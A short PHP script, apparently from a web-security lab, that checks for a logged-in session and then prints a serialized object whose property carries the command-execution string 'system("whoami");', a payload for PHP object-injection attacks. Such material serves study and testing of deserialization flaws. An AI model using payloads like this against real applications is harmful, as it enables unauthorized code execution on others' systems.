<?php
session_start();

if (!isset($_SESSION['user_id'])) {
    header("Location: ../../login.php");
    exit();
}
class Hyyy{
    public $payload = 'system("whoami");';
}
$a = new Hyyy;
echo serialize($a);
?>